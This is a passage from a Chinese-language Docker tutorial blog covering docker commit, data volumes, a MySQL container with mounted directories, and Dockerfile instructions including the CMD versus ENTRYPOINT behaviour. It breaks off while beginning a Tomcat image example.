<li>最上面的 Layer 3 是新加的，称为容器层，<strong>可写</strong>；</li>
</ol>
<p>用户所有的操作都在容器层，镜像层对用户来说只读，不能修改。一个容器经过用户修改后打包成镜像之后给再次使用，过程如下：</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230401115952.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<h2 id="commit-镜像">5.2. Commit 镜像</h2>
<p>命令：<code>docker commit</code>，打包容器为一个新的镜像，一般使用方式如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker commit -a=<span class="string">&quot;作者&quot;</span> -m=<span class="string">&quot;描述信息&quot;</span> 容器id 目标镜像名[:tag]</span><br></pre></td></tr></table></figure>
<p>实战测试：之前使用 tomcat 的时候 <code>webapps</code>
目录是空的，要想使用每次都要将 <code>webapps.disk</code>
目录内的东西复制到 <code>webapps</code>
才可以，非常麻烦。因此，本次实战将 <code>webapps.disk</code>
目录内的内容复制到
<code>webapps</code>，然后将其打包为一个新的镜像，之后只要启动这个新的镜像即可，不用再复制了。</p>
<p>第一步，启动
tomcat，<code>docker run -d -p 3355:8080 tomcat:9.0</code>；注意，别用
<code>-it</code> 方式，否则会直接进入容器，因为这是 tomcat，不是
linux，因此会显示 tomcat
的运行信息，这样还得退出（不停止），然后再进入；</p>
<p>第二步，进入容器，将 <code>webapps.disk</code> 内容复制到
<code>webapps</code> 下，并尝试访问宿主机端口 3355；</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230401121648.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230401121724.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>第三步，将该容器打包为一个新的镜像 <code>tomcat_web</code>；</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230401121851.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>第四步，删除现在的容器
<code>tomcat</code>，启动刚刚打包的镜像，为了作区分，这里映射到了 3399
端口；</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230401122113.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>最后，访问宿主机 3399 端口，查看是否成功；</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230401122156.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<h2 id="小结-1">5.3. 小结</h2>
<p>到这为止，算是入门了 docker 了，后面还有很长的路要走。</p>
<h1 id="容器数据卷">6. 容器数据卷</h1>
<h2 id="什么是容器数据卷">6.1. 什么是容器数据卷</h2>
<p>将应用和运行的环境打包形成容器，但我们对于数据希望是持久的，比如说安装了
MySQL 容器，将其删除，要保证 MySQL 的数据不被删除。</p>
<p>为了保存容器中的数据，就产生了卷技术，原理就是让数据挂载到本地，这样数据就不会随着容器删除而丢失了。</p>
<p>卷的设计目的就是
<strong>数据的持久化</strong>，使数据完全独立于容器的生存周期，因此
docker 不会在容器删除时同时将数据删除。</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230401154959.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>将物理机的 <code>/home/kali/mysql</code> 挂载到 MySQL 容器中的
<code>/usr/data</code>，这样 mysql 容器的数据就会直接写到
<code>/home/kali/mysql</code>，即使 mysql 容器被删除，而
<code>/home/kali/mysql</code> 不属于 UnionFS，所以没有被同时删除。</p>
<blockquote>
<p>这里要注意，数据只有一份，在硬盘内的某块空间只保存了一份数据，只不过这块空间在宿主机上叫做
<code>/home/kali/mysql</code>，而在容器内叫做
<code>/usr/data</code>。就像我们 U 盘插在电脑上，电脑就可以访问 U
盘了，这就是挂载，把目录映射到一块物理空间，对目录的操作就是对物理空间的操作。</p>
</blockquote>
<h2 id="数据卷">6.2. 数据卷</h2>
<p>个人理解：</p>
<ul>
<li>卷，volume，是容器与宿主机数据“沟通”的桥梁。Docker server
需要知道容器有多少路径挂载了宿主机，所以
<code>/var/lib/docker/volumes</code>
目录就是用来存放“所有不指定路径挂载”的卷，指定路径挂载的卷路径由用户自行管理；</li>
<li>卷，在容器看来就是容器内的目录，在宿主机看来就是宿主机的目录，docker
server 将挂载的宿主机、容器目录用卷联系起来，所以只是对 docker server
而言叫做卷；</li>
</ul>
<h3 id="使用数据卷">6.2.1. 使用数据卷</h3>
<p>命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -it -v 宿主机绝对路径:容器内目录 镜像名[:TAG]</span><br></pre></td></tr></table></figure>
<blockquote>
<p>想要映射多个目录，可以
<code>-v src1:dst1 -v src2:dst2 -v src3:dst3 ...</code></p>
</blockquote>
<p>在宿主机建立 <code>/home/kali/test</code>
目录（确保是空目录），然后使用命令将该目录挂载到容器的
<code>/home</code>
目录。<code>docker run -it -v /home/kali/test:/home cetos</code></p>
<p>在容器内的 <code>/home</code> 目录创建一个文件
<code>helloPhy.txt</code>，在宿主机 <code>/home/kali/test</code>
创建一个文件 <code>helloCont. txt</code></p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230401160618.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230401160633.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>然后分别查看容器的 <code>/home</code> 和宿主机的
<code>/home/kali/test</code>，会发现内容都是一样的：</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230401160717.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230401160710.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>在任意一边修改文件内容，另外一边也会同时修改。</p>
<p>将容器停止，数据存在，将容器删除，数据仍然存在。</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230401161240.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<h4 id="进一步">6.2.1.1. 进一步</h4>
<p>此时 <code>/home/kali/test</code>
非空，如果将一个非空目录挂载到容器上会是什么样子的呢？命令：<code>docker run -it --name centos01 -v /home/kali/test:/home centos</code></p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230401161615.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>居然可以将非空目录挂载，还以为会清空或者报错呢。</p>
<h3 id="安装-mysql">6.2.2. 安装 MySQL</h3>
<p>启动 <code>mysql:5.7</code>，因为对于 MySQL
我们不仅仅要数据，还可能经常修改配置文件，所以要将宿主机与 mysql
的数据目录和配置目录挂载。命令：<code>docker run -d -p 3356:3306 -v /home/mysql/conf:/etc/mysql/conf.d -v /home/mysql/data:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=root --name mysql01 mysql:5.7</code></p>
<p>解释：</p>
<ul>
<li><code>-e</code>：配置环境，mysql
容器再初次启动时需要配置密码，默认用户名 root；</li>
<li>需要对 mysql 的配置目录和数据目录有所了解；</li>
</ul>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230401163705.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>如果在挂载时，宿主机没有目录，会自动创建。可以使用
<code>docker inspect</code> 命令查看 <code>Mounts</code>
字段，发现挂载的详细信息：</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230401163815.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>连接 MySQL
<code>mysql -uroot -P 3356 -p</code>，需要指定端口，因为不是默认端口。</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230401163958.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>创建一个数据库 <code>test</code>，看一下宿主机的
<code>/home/mysql/data</code> 有没有变化</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230401164101.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>将容器停止、删除，再此查看：</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230401164140.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>实现 MySQL 数据持久化。</p>
<h2 id="具名挂载和匿名挂载">6.3. 具名挂载和匿名挂载</h2>
<ul>
<li>具名挂载：挂载的时候给卷起个名字；</li>
<li>匿名挂载：挂载的时候不给卷起名字；</li>
</ul>
<p>匿名挂载命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -d -P --name niming-nginx -v /etc/nginx nginx</span><br></pre></td></tr></table></figure>
<p>注意： <code>-v</code>
后面没有宿主机路径，直接是容器路径，这意味着会将容器内的
<code>/etc/nginx</code>
路径与宿主机挂载，但挂载在哪不知道，这就是匿名挂载。</p>
<p>具名挂载命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -d -P --name juming-nginx -v juming_test:/etc/nginx nginx</span><br></pre></td></tr></table></figure>
<p>注意：<code>-v</code> 后面加了
<code>juming_test:/etc/nginx</code>，这里可不是宿主机的相对路径，而是
<code>/etc/nginx</code> 挂载到宿主机的卷的名字叫做
<code>juming_test</code>，至于路径是什么待会再探讨。</p>
<p>可以使用 <code>docker volume ls</code> 查看所有挂载的卷。</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230401170029.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>可以看到一个
<code>juming_test</code>，这就是具名挂载，还有两个看不懂的字符串，这就是匿名挂载。</p>
<p>可以使用 <code>docker volums inspect 卷名</code>
来查看卷的相关信息：</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230401170212.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p><strong>热知识：所有 docker 容器内的卷，没有指定目录的情况下都是在
<code>/var/lib/docker/volumes/</code> 目录下</strong>。</p>
<p>指定路径挂载，以上面的 mysql 为例：</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230401171309.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>会发现，虽然挂载了，但 <code>docker volume ls</code>
没有显示卷内容，这是因为指定了路径，所以卷就不在
<code>/var/lib/docker</code> 中，而是在指定目录位置，而
<code>docker volume ls</code> 估计只是展示 <code>/var/lib/docker</code>
下的卷。</p>
<p>匿名挂载、具名挂载和指定路径挂载区别：</p>
<ol type="1">
<li><code>-v</code> 后面直接加路径的就是匿名；</li>
<li><code>-v</code> 后面的格式是这样的 <code>xx:path</code>
的就是具名挂载；</li>
<li><code>-v</code> 后面的格式是这样的 <code>/xx:path</code>
的就是指定路径挂载，<code>/</code> 是 Linux 中根目录，所以
<strong>指定路径挂载必须使用决定路径</strong>；</li>
</ol>
<p>补充一个小知识，挂载的时候可以改变文件的读写权限，<code>ro，read only；rw，readwrite</code>。命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -d -v [path or valumeName:path:priviledge] 镜像名</span><br></pre></td></tr></table></figure>
<h2 id="初识-dockerfile">6.4. 初识 Dockerfile</h2>
<p><strong>Dockerfile 是用来构建 docker 镜像的文件</strong>。假设如下
dockerfile 内容：</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> centos</span><br><span class="line"><span class="keyword">VOLUME</span><span class="bash"> [<span class="string">&quot;vol01&quot;</span>, <span class="string">&quot;vol02&quot;</span>]</span></span><br><span class="line"><span class="keyword">CMD</span><span class="bash"> [<span class="string">&quot;/bin/bash&quot;</span>]</span></span><br></pre></td></tr></table></figure>
<p>解释：</p>
<ol type="1">
<li>第一行：该 dockerfile 构建的镜像时基于什么镜像的，这是 FROM
的作用；</li>
<li>第二行：匿名挂载，将 <code>vol01</code>、<code>vol02</code>
挂载匿名挂载，需要注意，这里路径要写对，没有写路径的话默认是容器根目录；</li>
<li>第三行：容器启动后默认要运行的程序，程序运行结束，容器也就结束，可以使用
<code>docker run</code> 时指定程序覆盖默认，如果有多条
CMD，最后一条生效；</li>
<li>每一行最前面的是命令，大小写无所谓；</li>
</ol>
<p>使用命令 <code>docker build</code> 构建：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker build -f dockerfile01 -t mycentos1 .</span><br></pre></td></tr></table></figure>
<ul>
<li><code>-f</code> 是指定 dockerfile 路径；</li>
<li><code>-t</code> 是镜像名或者加上
<code>[:tag]</code>，不能有大写；</li>
<li>最后的点看如下文字，参考：<a
href="https://blog.csdn.net/xs20691718/article/details/79502019">docker
build 命令后 . 号的意思_许许盛的博客-CSDN博客</a></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">最后的点很有意思，这里还用不到这个知识点，Docker 在运行时分为 Docker 引擎（服务端守护进程） 以及 客户端工具，我们日常使用各种 docker 命令，其实就是在使用客户端工具与 Docker 引擎 进行交互。</span><br><span class="line"></span><br><span class="line">那么当我们使用 docker build 命令来构建镜像时，这个构建过程其实是在 Docker引擎中完成的，而不是在本机环境。</span><br><span class="line"></span><br><span class="line">那么如果在 Dockerfile 中使用了一些 COPY 等指令来操作文件，如何让 Docker引擎 获取到这些文件呢？</span><br><span class="line"></span><br><span class="line">这里就有了一个 镜像构建上下文 的概念，当构建的时候，由用户指定构建镜像的上下文路径，而 docker build 会将这个路径下所有的文件都打包上传给 Docker 引擎，引擎内将这些内容展开后，就能获取到所有指定上下文中的文件了。</span><br><span class="line"></span><br><span class="line">比如说 dockerfile 中的 COPY ./package.json /project，其实拷贝的并不是本机目录下的 package.json 文件，而是 docker引擎中展开的构建上下文中的文件，所以如果拷贝的文件超出了构建上下文的范围，Docker引擎是找不到那些文件的。</span><br><span class="line"></span><br><span class="line">所以 `docker build` 最后的 `.` 号，其实是在指定镜像构建过程中的上下文环境的目录。</span><br></pre></td></tr></table></figure>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230401210117.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>查看该镜像并启动：</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230401210243.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>查看该容器信息，重点关注 <code>Mounts</code>：</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230401210414.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>注意，如果在 dockerfile 中没有挂载卷，就需要在 run 的时候手动加
<code>-v</code> 挂载。</p>
<h2 id="数据卷容器">6.5. 数据卷容器</h2>
<p>之前说过，多个容器之间是互相隔离的，那有没有办法让他们数据共享呢？有，就是数据卷容器，简单来说就是让它们的目录都挂载了宿主机同一个目录。</p>
<p>以刚刚创建的镜像为例，我们依次启动两个容器，第一个正常启动，第二个使用参数
<code>--volumes-from</code>。</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230401213522.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>进入两个容器，会发现两个容器都有 <code>vol01</code> 和
<code>vol02</code>。</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230401213641.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>尝试在容器 1 的 <code>vol01</code> 中添加文件
<code>test.txt</code>，观察容器 2 中的 <code>vol02</code> 变化：</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230401213751.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>可以看到，一边添加，两边同时存在数据。</p>
<h1 id="dockerfile">7. Dockerfile</h1>
<h2 id="介绍">7.1. 介绍</h2>
<p>Dockerfile 是用来构建镜像的文件，是一个命令参数脚本。</p>
<p>构建步骤：</p>
<ol type="1">
<li>编写一个 dockerfile 文件；</li>
<li><code>docker build</code> 构建称为一个镜像；</li>
<li><code>docker run</code> 运行镜像；</li>
<li><code>docker push</code> 发布镜像到仓库；</li>
</ol>
<p>可以查看一下官方的，在 docker hub 搜索
centos，点击下图的版本，会跳转到 github，github 里面就是 dockerfile
的内容</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230401214527.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230401214550.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<h2 id="构建过程">7.2. 构建过程</h2>
<p>基础知识：</p>
<ol type="1">
<li>每一行指令都会创建一个新的镜像层；</li>
<li><code>#</code> 表示注释；</li>
<li>执行顺序：从上到下；</li>
<li>每个保留关键字（指令）可以大写也可以小写，约定是大写；</li>
</ol>
<p>Dockerfile 是面向开发的，发布项目、做镜像都需要用到 dockerfile
文件，并且 docker 镜像逐渐成为企业交付的标志，步骤如下：</p>
<ol type="1">
<li>DockeFile：构建文件，定义了一切的步骤，源代码；</li>
<li>DockerImage：通过 DockerFile 生成的镜像，最终发布和运行的产品；</li>
<li>Docker 容器：容器就是镜像运行起来的服务器；</li>
</ol>
<h2 id="指令说明">7.3. 指令说明</h2>
<p>常用指令：</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span>           <span class="comment"># 基础镜像，一切从这里开始  </span></span><br><span class="line"><span class="keyword">MAINTAINER</span>     <span class="comment"># 镜像维护者信息：一般是姓名+邮箱</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash">            <span class="comment"># 镜像构建时需要运行的命令（构建过程中执行）</span></span></span><br><span class="line"><span class="keyword">EXPOSE</span>         <span class="comment"># 当前容器对外保留出的端口  </span></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="bash">        <span class="comment"># 指定在运行容器后，终端默认登录的进来工作目录，一个落脚点  </span></span></span><br><span class="line"><span class="keyword">ENV</span>            <span class="comment"># 用来在构建镜像过程中设置环境变量  </span></span><br><span class="line"><span class="keyword">ADD</span><span class="bash">            <span class="comment"># 将宿主机目录下（上下文管理器）的文件拷贝进镜像且ADD命令会自动处理URL和解压tar压缩包  </span></span></span><br><span class="line"><span class="keyword">COPY</span><span class="bash">           <span class="comment"># 类似ADD，拷贝文件和目录到镜像中！  </span></span></span><br><span class="line"><span class="keyword">VOLUME</span><span class="bash">         <span class="comment"># 容器数据卷，用于数据保存和持久化工作  </span></span></span><br><span class="line"><span class="keyword">CMD</span><span class="bash">            <span class="comment"># 指定一个容器启动时要运行的命令，dockerFile中可以有多个CMD指令，只有最后一个生效，可被替代！（启动容器时执行）</span></span></span><br><span class="line"><span class="keyword">ENTRYPOINT</span><span class="bash">     <span class="comment"># 指定一个容器启动时要运行的命令！和CMD一样，可以追加命令（启动容器时执行）</span></span></span><br><span class="line"><span class="keyword">ONBUILD</span>        <span class="comment"># 当构建一个被继承的DockerFile时运行命令，父镜像在被子镜像继承后，父镜像的ONBUILD被触发</span></span><br></pre></td></tr></table></figure>
<h2 id="实战测试">7.4. 实战测试</h2>
<p>Docker HUb 中大部分的镜像的基础镜像都是 scratch 。</p>
<p>启用 centos 容器，进入容器，发现当前的工作目录时根目录，并且没有
<code>ifconfig</code> 命令。</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230401225022.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>实战：创建 centos 镜像，使其带有 <code>ifconfig</code>
命令并且工作目录为 <code>/usr/local</code>。</p>
<p>第一步，创建 dockerfile 文件</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> centos:<span class="number">7</span></span><br><span class="line"><span class="keyword">MAINTAINER</span> takagi&lt;hongdf1998@gmail.com&gt;</span><br><span class="line"><span class="keyword">ENV</span> MYPATH /usr/local</span><br><span class="line"><span class="keyword">WORKDIR</span><span class="bash"> <span class="variable">$MYPATH</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> yum -y install net-tools</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">80</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">CMD</span><span class="bash"> [<span class="string">&quot;/bin/bash&quot;</span>]</span></span><br></pre></td></tr></table></figure>
<p>解释：</p>
<ul>
<li><code>FROM centos:7</code>，最新版是 8，但已经结束了声明周期，所以
yum 命令不能够从官方源获取资源，会报错，所以使用 centos 7 可以；</li>
<li><code>ENV MYPATH /usr/local</code>：定义 MYPATH 为
<code>/usr/local</code>，由于镜像的层次文件系统，ENV
定义的环境变量在后续层次中才能够被应用；</li>
<li><code>WORKDIR $MYPATH</code>：将 MYPATH 的值作为 WORKDIR；</li>
<li><code>RUN yum -y install net-tools</code>：在构建过程中下载
<code>net-tools</code>；</li>
<li><code>EXPOSE 80</code>：暴露容器 80 端口；</li>
</ul>
<p>第二步，创建容器</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230401230142.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>第三步，运行并进入该容器</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230401230200.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>此时的目录时 <code>/usr/local</code>，并且 <code>ifconfig</code>
命令可以使用。</p>
<p>最后一步，查看镜像构建的历史，使用命令
<code>docker history</code>。</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230401230653.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>从下到上才是执行过程。</p>
<h2 id="cmd-和-entrypoint-区别">7.5. CMD 和 ENTRYPOINT 区别</h2>
<p>来自官方文档的解释：<a
href="https://docs.docker.com/engine/reference/builder/#cmd">Dockerfile
reference</a>，CMD 命令有以下三种形式：</p>
<ul>
<li><code>CMD ["executable", "param1", "param2", ...]</code>，exec
form，官方推荐；</li>
<li><code>CMD ["param1", "param2", ...]</code>，作为 ENTRYPOINT
的参数；</li>
<li><code>CMD command param1 param2 ...</code>，shell form；</li>
</ul>
<p>这里先解释一下什么是 exec from 和 shell form：</p>
<ul>
<li><code>shell form</code>：从 shell 执行，类似于
<code>/bin/bash mysql</code>，从 shell 终端执行 mysql；</li>
<li><code>exec form</code>：直接执行，<strong>此时后面跟的是可执行文件</strong>，<code>CMD ["mysql"]</code>，此时就不是从
shell 终端执行，而是类似于点击 mysql 应用程序一样，直接执行；</li>
</ul>
<p>创建一个 dockerfile：</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> centos:<span class="number">7</span></span><br><span class="line"><span class="keyword">CMD</span><span class="bash"> <span class="built_in">echo</span> <span class="string">&#x27;hello world&#x27;</span></span></span><br></pre></td></tr></table></figure>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230402085616.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>如果我们使用命令 <code>docker run cmdtest:1.0 echo hello cmd</code>
启动，则结果如下：</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230402085709.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>可以看到，dockerfile 中的 CMD 被覆盖了。</p>
<p>创建另一个 dockerfile：</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> centos:<span class="number">7</span></span><br><span class="line"><span class="keyword">CMD</span><span class="bash"> [<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;echo &#x27;hello world&#x27;&quot;</span>]</span></span><br></pre></td></tr></table></figure>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230402090329.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>这就相当于容器执行了
<code>/bin/bash -c "echo 'hello world'"</code>。</p>
<p>如果我们使用命令 <code>docker run cmdtest:2.0 echo hello cmd</code>
启动，结果如下：</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230402090506.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>可以看到，CMD 的指令会被执行时携带的指令覆盖。</p>
<hr />
<p>官方文档：<a
href="https://docs.docker.com/engine/reference/builder/#entrypoint">Dockerfile
reference</a>，ENTRYPOINT 有两种形式：</p>
<ul>
<li><code>ENTRYPOINT ["executable", "param1", "param2", ...]</code>；</li>
<li><code>ENTRYPOINT command param1 param2 ...</code>；</li>
</ul>
<p>这两者的区别是前者为 <code>exec fomr</code> 后者为
<code>shell form</code>。</p>
<p>第一个 dockerfile 文件：</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> centos:<span class="number">7</span></span><br><span class="line"><span class="keyword">ENTRYPOINT</span><span class="bash"> <span class="built_in">echo</span> <span class="string">&#x27;hello world&#x27;</span></span></span><br></pre></td></tr></table></figure>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230402090959.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>如果带指令启动，结果为：</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230402091204.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>可以发现任何指令、参数都无法覆盖 ENTRYPOINT。</p>
<p>第二个 dockerfile 文件：</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> centos:<span class="number">7</span></span><br><span class="line"><span class="keyword">ENTRYPOINT</span><span class="bash"> [<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;echo &#x27;hello world&#x27;&quot;</span>]</span></span><br></pre></td></tr></table></figure>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230402092501.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>任何指令、参数也都无法覆盖 ENTRYPOINT。</p>
<p>第三、四个 dockerfile：</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> centos:<span class="number">7</span></span><br><span class="line"><span class="keyword">CMD</span><span class="bash"> [<span class="string">&#x27;the param is from cmd&#x27;</span>]</span></span><br><span class="line"><span class="keyword">ENTRYPOINT</span><span class="bash"> <span class="built_in">echo</span></span></span><br></pre></td></tr></table></figure>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> centos:<span class="number">7</span></span><br><span class="line"><span class="keyword">CMD</span><span class="bash"> [<span class="string">&quot;-c&quot;</span>, <span class="string">&quot;echo &#x27;the param is from cmd&#x27;&quot;</span>]</span></span><br><span class="line"><span class="keyword">ENTRYPOINT</span><span class="bash"> [<span class="string">&quot;/bin/bash&quot;</span>]</span></span><br></pre></td></tr></table></figure>
<p>前者的运行结果：</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230402093153.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>无法将 CMD 中的参数传入。</p>
<p>后者的运行结果：</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230402093314.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>成功使用了 CMD 中的参数。</p>
<p>并且这两个也都无法在执行时使用指令或者参数覆盖。但后者可以追加指令：</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230402093655.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>可以看到将 <code>-c "echo 'hello world'"</code> 追加到
<code>/bin/bash</code> 之后形成完整的命令，并且把 CMD 覆盖。</p>
<h2 id="实战tomcat-镜像">7.6. 实战：tomcat 镜像</h2>
<p><strong>第一步，准备镜像文件</strong>：</p>
<ul>
<li>Tomcat 压缩包，下载地址：<a
href="https://tomcat.apache.org/download-90.cgi">Apache Tomcat® - Apache
Tomcat 9 Software Downloads</a>；</li>
<li>Jdk 压缩包，jdk 历史版本下载地址：<a
href="http://www.oracle.com/technetwork/java/javase/archive-139210.html">Java
Archive | Oracle</a>；</li>
<li>介绍文档：readme；</li>
</ul>
<p><strong>第二步，编写 dockerfile</strong>，文件名为
